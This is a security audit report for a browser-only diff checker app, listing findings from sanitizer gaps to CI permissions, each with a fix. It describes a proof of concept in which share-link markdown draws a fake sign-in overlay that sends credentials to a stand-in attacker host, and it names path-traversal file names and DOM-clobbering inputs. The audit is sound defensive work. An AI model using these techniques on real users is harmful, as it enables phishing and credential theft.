# Security Audit: Diff Checker

**Date:** 2026-11-02
**Commit audited:** `99e4b02` (main)
**Scope:** everything in the repo that ships to users or builds what ships: `src/`, `public/`, `index.html`, `vite.config.ts`, `package.json` / lockfile, `.github/workflows/`.
**Method:** manual review of every untrusted-input path, `npm audit`, unit probes against the sanitizer, and a Playwright proof of concept against the production build.

## Threat model

The app has no backend, so the usual server attacks don't apply. What matters is what an attacker can make the page do in a victim's browser on the `u77w41.github.io` origin, plus the supply chain that builds the site.

Attacker-controlled input reaches the app through:

1. **Share links** (`#s=<lz-string>`): the most dangerous path. One click and the payload renders, with no file picker and no warning.
2. **Diff bundles** (`.json` files the victim imports).
3. **Files and URLs** the victim loads on purpose: a notebook from a colleague, a raw GitHub URL.
4. **The build pipeline**: npm dependencies and GitHub Actions running with deploy rights.

The origin is shared with the author's other sites (`/support-my-work/`, `/anurup/`), so anything that abuses the origin's reputation hurts more than this one tool.

## What is already done well

- Notebook HTML outputs render in `<iframe sandbox="" srcdoc>`: no scripts, no forms, no top navigation. I checked it, and it holds.
- `script-src 'self'` in the CSP blocks inline event handlers, so a sanitizer bypass is much less likely to become script execution.
- `img-src 'self' data: blob:` stops tracking pixels in notebooks.
- `javascript:` links are stripped. `<iframe>`, `<meta refresh>`, `<script>` and `on*` attributes are removed from markdown.
- Diffing runs in a worker with a 10-second timeout, and uploads are capped at 50 MB.
- `localStorage` access is wrapped in `try/catch`, inputs are only stored on opt-in, and `theme-init.js` allow-lists its values.
- `diff@9` quotes file names in patch headers, so a newline in a file name can't inject extra hunks. I tested this.
- The share modal already warns that anyone with the link can read both inputs.

## Findings

Severity uses impact × likelihood for this app. "Effective" accounts for existing mitigations.

| ID | Finding | Severity |
|----|---------|----------|
| S1 | Share-link markdown can overlay the page and phish credentials | **High** |
| S2 | DOMPurify 3.2.4 has a known high-severity advisory | **High** (effective Medium) |
| S3 | CI gives deploy rights to the job that runs all dev dependencies; actions use mutable tags | **Medium** |
| S4 | Sanitizer fails open | **Medium** |
| S5 | Share links and bundles are not size-capped or type-checked | **Medium-Low** |
| S6 | CSP gaps: no `form-action`, broad `connect-src`, `frame-src data:` | **Low** (part of S1's fix) |
| S7 | Remote loader allows `http:`, has no size cap, sends credentials | **Low** |
| S8 | Markdown links navigate the tab away; `id`/`name` clobbering | **Low** |
| S9 | Patch file names from share links are not normalised | **Low** |
| S10 | Clickjacking can't be blocked on GitHub Pages | **Info** (accepted) |
| S11 | Privacy: share URLs and remembered inputs hold full content in plain text | **Info** |

---

### S1: Share-link markdown can overlay the page and phish credentials (High)

**Where:** `src/ui/nb-view/renderers/markdown.ts` (`sanitizeHtml`), `src/ui/nb-view/CellCard.svelte` (`{@html}` into `.rendered-prose`), `index.html` CSP.

DOMPurify's default profile keeps `<form>`, `<input type="password">`, `<button>` and inline `style`. The CSP has no `form-action`, and `.rendered-prose` doesn't contain its children. So a markdown cell can:

- draw a `position:fixed; inset:0; z-index:max` panel over the whole app, and
- put a working login form in it that submits to any host.

**Proof of concept** (production build, Chromium): a 691-character `#s=` link with one notebook markdown cell. On load, the overlay covered the viewport with "Session expired – sign in to GitHub to view this diff". Typing into it and pressing the button sent `GET https://evil.example/collect?user=victim&password=hunter2`. The browser logged no CSP violation.

**Why High:** one click, no interaction beyond what the fake page asks for, on a trusted github.io origin, and the link looks like an ordinary diff share.

**Fix (defence in depth, all three):**

1. Sanitizer: forbid `form`, `input`, `button`, `textarea`, `select`, `option`, `style`. Strip `position` values other than `static`/`relative` from inline styles (via CSSOM, so CSS escapes can't sneak past). KaTeX never emits `position` inline (checked: it uses `height`, `vertical-align`, `top`, margins, padding, `min-width`, `border-bottom-width`).
2. CSS: `.rendered-prose { contain: layout paint; overflow: auto; position: relative; }`. `contain: paint` makes the cell the containing block for fixed descendants and clips them, so nothing can escape the cell even if a style gets through.
3. CSP: add `form-action 'none'`.

### S2: DOMPurify 3.2.4 has a known high-severity advisory (High, effective Medium)

**Where:** `package.json` → `dompurify@3.2.4`.

`npm audit` lists seven advisories, including mutation-XSS through re-contextualisation (GHSA-h8r8-wccr-v5f2) and a `USE_PROFILES` prototype-pollution issue (GHSA-cj63-jhhr-wcxv). Several only bite with `IN_PLACE` or custom-element options we don't use, but mXSS applies to plain `sanitize()`. This is the only sanitizer between share-link markdown and the DOM.

The CSP (`script-src 'self'`) blocks the inline handlers an mXSS would normally inject, which is why the effective rating is Medium. One config mistake in the CSP would take it back to High.

**Fix:** pin `dompurify@3.4.17` (published 2026-10-12, which passes the 14-day rule). Add `npm audit --omit=dev --audit-level=high` to CI.

### S3: CI/CD supply chain (Medium)

**Where:** `.github/workflows/deploy.yml`, `.github/workflows/ci.yml`.

- `deploy.yml` sets `pages: write` and `id-token: write` at **workflow** level, so the `checks` job gets them too. That job runs `npm ci` and every dev dependency (ESLint plugins, Vite plugins, Playwright, about 580 packages). One compromised package could mint an OIDC token and push its own build to Pages.
- `ci.yml` has no `permissions` block, so it falls back to the repo default token scope.
- All actions are pinned to mutable tags (`actions/checkout@v4`, …).
- There's no Dependabot. Twenty-one dev-tool advisories sit unpatched (all build-time; none ships to users).

**Fix:** per-job permissions (`checks`: `contents: read` only; `deploy`: `pages: write`, `id-token: write`); `permissions: contents: read` in `ci.yml`; pin each action to a commit SHA with a version comment; add `.github/dependabot.yml` for `npm` and `github-actions`.

### S4: Sanitizer fails open (Medium)

**Where:** `sanitizeHtml` in `markdown.ts`.

If DOMPurify can't be resolved as a function (a bundling change, an ESM/CJS mismatch after an upgrade), the function quietly returns the raw HTML. A security control should fail closed.

**Fix:** if no sanitizer is available, return the input HTML-escaped (shown as text) and log once. Create one dedicated DOMPurify instance with hooks at module load.

### S5: Share links and bundles are not size-capped or type-checked (Medium-Low)

**Where:** `decodeSharePayload`, `parseDiffBundle` in `src/core/share.ts`; the spreads at `App.svelte` lines 137–142 and 257–262.

- **Decompression bomb:** LZ-string's ratio grows with input size (measured: 962 chars → 208×, 8,424 chars → 1,187×). Decoding runs on the main thread with no cap on input or output, so a link of a few tens of KB can produce hundreds of MB and freeze or crash the tab. The encoder refuses links over 8 KB, but the decoder accepts anything.
- **Untyped fields:** `options` is spread straight into `DiffOptions`/`NbDiffOptions`, and `fileNameA/B` aren't type-checked. A link can set `granularity: 42` or `similarityThreshold: "x"`, or make `fileNameA` an object, which crashes `generateGitPatch` (`.trim` is not a function). Spread copies `__proto__` as an own property, so this is not prototype pollution, but it is easy type confusion and crashes.

**Fix:** reject encoded data over 16,384 chars before decompressing; reject decoded JSON over 10 MiB; allow-list option keys with type and range checks; require file names to be strings of at most 255 chars.

### S6: CSP gaps (Low, partly fixed under S1)

- No `form-action` → S1.
- `frame-src` allows `data:`. Nothing uses it (HTML outputs use `srcdoc`), so remove it.
- `connect-src 'self' https:` lets any script that does run send data to any HTTPS host. It's needed for "Load from URL", so we keep it and accept the risk. `script-src 'self'` is the control that matters here.
- `style-src 'unsafe-inline'` is needed by CodeMirror and Svelte. Accepted; S1's containment covers the abuse case.

### S7: Remote loader (Low)

**Where:** `src/core/remote.ts`.

- Accepts `http:`. On the HTTPS site, mixed-content rules block it anyway, so users get a confusing CORS error. Allow `https:` only.
- No response size cap. The 50 MB upload limit doesn't apply here, so a huge or endless response can exhaust memory. Stream it and stop at 50 MB.
- `fetch` uses default credentials and referrer. Use `credentials: 'omit'` and `referrerPolicy: 'no-referrer'` so the loader never sends cookies and never tells the remote host where the request came from.

### S8: Markdown links and DOM clobbering (Low)

- `[docs](https://…)` opens in the same tab, so clicking it loses the user's diff, and the link text can pass itself off as an in-app action. Add `target="_blank" rel="noopener noreferrer"` to every sanitized `<a href>`.
- `id` and `name` survive sanitising (`<img id="app" name="settings">`), so markdown can clobber `window.<name>` and `document.getElementById` lookups. Turn on DOMPurify's `SANITIZE_NAMED_PROPS`, which prefixes them with `user-content-`.

### S9: Patch file names (Low)

**Where:** `generateGitPatch` in `src/core/patch.ts`.

A share link can set `fileNameA` to `../../.bashrc` or `/etc/hosts`, and the downloaded patch will name that path. `git apply` and current GNU `patch` refuse `..`, but older tools and hand-rolled scripts may not. Normalise to a safe relative path: drop the leading `/`, drop `..` and `.` segments, drop control characters, and fall back to `file.txt`.

### S10: Clickjacking (Info, accepted)

GitHub Pages can't send `X-Frame-Options` or a `frame-ancestors` header, and browsers ignore `frame-ancestors` in a `<meta>` CSP. The app has no account and no state-changing actions, so framing it gains an attacker little. Accepted and documented.

### S11: Privacy notes (Info)

- Share links put both inputs in the URL fragment. Fragments never reach a server, but they do stay in browser history, synced history and anywhere the link gets pasted. The modal already says "Anyone with this link can read both inputs". Add that the link also stays in browser history.
- "Remember inputs" stores both inputs as plain text in `localStorage`. It's opt-in. Add a short hint that it shouldn't be used on shared computers.

## Residual risk after the fixes

- Arbitrary HTTPS egress (`connect-src https:`), kept for the URL loader.
- `style-src 'unsafe-inline'`, required by the editor.
- Clickjacking (S10).
- Trust in DOMPurify itself. Mitigated by the CSP and containment, and kept current by Dependabot.
